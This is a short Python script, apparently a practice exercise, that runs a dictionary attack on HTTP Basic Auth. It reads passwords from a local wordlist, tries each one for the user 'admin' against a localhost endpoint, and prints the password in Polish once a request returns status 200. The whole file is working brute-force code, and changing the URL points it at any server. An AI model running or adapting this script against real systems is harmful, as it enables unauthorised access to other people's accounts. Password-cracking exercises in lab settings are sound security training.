import requests
from requests.auth import HTTPBasicAuth

url = 'http://localhost:3000/helloWorld'
password_file = open('./passwords.txt', 'r').readlines()

for line in password_file:
    password = line.strip().encode('ascii', 'ignore').decode('ascii')
    response = requests.get(url, auth=HTTPBasicAuth('admin', password))
    print(f'Trying with pass: {password}   result {response.status_code}')
    if response.status_code == 200:
        print(f"Znaleziono! Hasło: {password}")
        break

